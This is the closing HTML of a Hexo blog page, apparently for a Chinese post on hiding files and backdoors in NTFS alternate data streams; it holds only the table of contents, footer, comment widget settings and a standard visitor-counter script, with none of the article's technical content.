+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是NTFS交换数据流（ADS）"><span class="nav-number">1.</span> <span class="nav-text">什么是NTFS交换数据流（ADS）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTFS交换数据流隐藏文件实例"><span class="nav-number">2.</span> <span class="nav-text">NTFS交换数据流隐藏文件实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏文本"><span class="nav-number">2.1.</span> <span class="nav-text">隐藏文本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏文件"><span class="nav-number">2.2.</span> <span class="nav-text">隐藏文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏后门（此段来自FreeBuf）"><span class="nav-number">2.3.</span> <span class="nav-text">隐藏后门（此段来自FreeBuf）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何检测和清除NTFS-ADS隐藏的文件"><span class="nav-number">3.</span> <span class="nav-text">如何检测和清除NTFS-ADS隐藏的文件</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Veritas501</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '5lMbuXdt5hbFRNKM5uaAC1xm-gzGzoHsz',
+        appKey: 'vA8ML592eyDDRr5tl4J9Eco3',
+        placeholder: '说点什么...',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("97qzbH6lJuabRg1KDY7DtJRS-gzGzoHsz", "GS8vVhMCaeXncQF8mQOIShBj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            
+            counter.save(null, {
+              success: function(counter) {
+                
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
